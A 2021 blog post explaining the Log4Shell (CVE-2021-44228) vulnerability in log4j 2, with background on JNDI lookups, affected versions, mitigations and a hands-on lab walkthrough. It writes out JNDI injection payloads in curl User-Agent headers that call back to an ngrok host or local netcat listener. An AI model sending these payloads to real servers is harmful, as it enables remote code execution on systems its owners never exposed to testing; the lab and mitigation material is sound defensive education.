---
title: 'Play with log4shell; just for fun.'
date: 2021-12-12
author: 'John Stilia'
description: 'Log4Shell: RCE 0-day exploit in log4j 2, a Java logging package'
categories: [Cyber Security]
tags: [Java, 0-day, RCE, log4j, CVE-2021-44228, CVE]

resources:
  - name: featured-image
    src: log4jimage.jpg
  - name: featured-image-preview
    src: log4jimage.jpg

draft: false
lightgallery: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  auto: false
comment:
  enable: true
---

Log4Shell: RCE 0-day exploit in log4j 2, a Java logging package

<!--more-->

{{< admonition danger>}}
For educational purposes only. Please do not use it for illegal purposes.

I am not a Java Developer, and I am not responsible for any damage caused by this code.

This is a proof of concept.
{{< /admonition >}}

A 0-day exploit in the popular Java logging library log4j (version 2) resulted in Remote Code Execution (RCE) by logging a particular string.
The impact of this vulnerability is quite severe. It is called "Log4Shell" for short. Considering how widespread this library is, this impact can result in complete server control.

The initial mention of the vulnerability was made by [@P0rZ9](https://twitter.com/P0rZ9) on [Twitter](https://twitter.com/P0rZ9/status/1468949890571337731).

# What is JNDI?

The Java Naming and Directory Interface is a Java API for a directory service that allows Java software clients to discover and look up data and resources via a name.
Like all Java APIs that interface with host systems, JNDI is independent of the underlying implementation

# ${jndi:ldap://example.com/a}

Log4j contains [special syntax](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) in the form `${prefix:name}` where prefix is one of a number of different [Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html) where name should be evaluated.
For example, `${java:version}` is the current running version of Java.
LOG4J2-313 added a jndi Lookup as follows: `“The JndiLookup allows variables to be retrieved via JNDI. By default the key will be prefixed with java:comp/env/, however if the key contains a ":" no prefix will be added.”`
With a `:` present in the key, as in `${jndi:ldap://example.com/a}` there’s no prefix and the LDAP server is queried for the object. And these Lookups can be used in both the configuration of Log4j as well as when lines are logged.

# Who is Impacted

Anybody using Apache Struts is likely vulnerable. In particular, any Log4J version prior to v2.15.0 is affected by this vulnerability.
In addition, the version 1 branch of Log4J is vulnerable to other RCE attacks and should be updated.

Many companies have been impacted, including big names such as Apple, Amazon, Twitter, and Tesla.
Here is a comprehensive list of impacted companies as of the time of the vulnerability release. [YfryTchsGD/Log4jAttackSurface](https://github.com/YfryTchsGD/Log4jAttackSurface#the-list)

## Affected Apache log4j2 versions​

2.0 <= Apache log4j <= 2.14.1

## Permanent Mitigation​

Version 2.15.0 of log4j has been released without the vulnerability. log4j-core.jar is available on Maven Central here, with [release notes] and [log4j security announcements](https://logging.apache.org/log4j/2.x/security.html).

## Temporary Mitigation

As per the discussion at [HackerNews](https://news.ycombinator.com/item?id=29507263) there are few ways to mitigate this vulnerability temporarily.
{{< admonition note>}}
If you are using a version older than 2.10.0 and cannot upgrade,
your mitigation choices are:

- Modify every logging pattern layout to say %m{nolookups}
  instead of %m in your logging config files,
  see details at <https://issues.apache.org/jira/browse/LOG4J2-2109>

or

- Substitute a non-vulnerable or empty implementation of the
  class org.apache.logging.log4j.core.lookup.JndiLookup,
  in a way that your classloader uses your replacement instead
  of the vulnerable version of the class.
  Refer to your application's or stack's classloading
  documentation to understand this behaviour.
  {{< /admonition >}}

# Digging deeper

The Java Naming and Directory Interface (JNDI) is a Java API for a directory service that allows you to interface with LDAP or DNS to look up data and resources. Unfortunately, one of the data types that can be returned is a URI pointing to a Java class — and if you load an untrusted Java class, then you’re unwittingly executing someone else’s code.

Even logging a message like the following can trigger a remote LDAP call, causing a criminal Java class to be instantiated.

`log.info("this is a security nightmare! {}", userInput);`

A real-world example of this same issue would be:

`log.info("Request User-Agent: {}", userAgent);`

A curl request to a remote server would look like this:

`curl -H 'User-Agent: ${jndi:ldap://ee32-de2f-71a.ngrok.io:8888/a}' https://vurnable-host.com/`

Where `ee32-de2f-71a.ngrok.io:8888` could be a netcat listener running.

As seen on [www.fastly.com](https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j/)
{{< figure src="https://raw.githubusercontent.com/stiliajohny/stiliajohny.github.io/master/content/posts/play-with-log4shell-just-for-fun/log4j-2.png" title="How the attack works" >}}

# Fun time, exploit all the things

- Head to [leonjza/log4jpwn](https://github.com/leonjza/log4jpwn)
- After cloning the repo, run the following command:

  `docker build -t log4jpwn .` # This will build a docker image from the current directory.

- Run the docker image:

  `docker run --rm -p5555:8080 log4jpwn`

- start a netcat listener on port 8888

  `nc -lnvp 8888`

- Get your docker interface host ip address:

  `ip a s docker0 | grep inet | awk '{print $2}' | cut -d/ -f1`
  {{< admonition tip >}}
  That would work in Linux and macOS, but not windows.
  Replace the `docker0` with your docker interface name.
  {{< /admonition >}}

- Exploit the _log4j_ vulnerability.
  `curl -H 'User-Agent: ${jndi:ldap://172.16.182.1:8081/a}' localhost:5555`
  We can clearly see the log4j library attempted a connection on the netcat listener.
  {{< figure src="https://raw.githubusercontent.com/stiliajohny/stiliajohny.github.io/master/content/posts/play-with-log4shell-just-for-fun/log4j-1.png" >}}

Here we can see the vulnerable library did a callout to the netcat listener. This could be used for all short of attacks.
For more info, look at:

- <https://github.com/xiajun325/apache-log4j-rce-poc>
- <https://www.youtube.com/watch?v=7qoPDq41xhQ&list=TLPQMTIxMjIwMjFkNI5H5Sjm6w>

# References

- <https://www.lunasec.io/docs/blog/log4j-zero-day/>
- <https://github.com/leonjza/log4jpwn>
- <https://github.com/YfryTchsGD/Log4jAttackSurface>
- <https://logging.apache.org/log4j/2.x/security.html>
- <https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j>
- <https://www.youtube.com/watch?v=7qoPDq41xhQ&list=TLPQMTIxMjIwMjFkNI5H5Sjm6w>
- <https://github.com/xiajun325/apache-log4j-rce-poc.git>
- <https://github.com/mbechler/marshalsec.git>
- <https://logging.apache.org/log4j/2.x/manual/lookups.html>
- <https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution>
- <https://issues.apache.org/jira/browse/LOG4J2-313>
- <https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/>
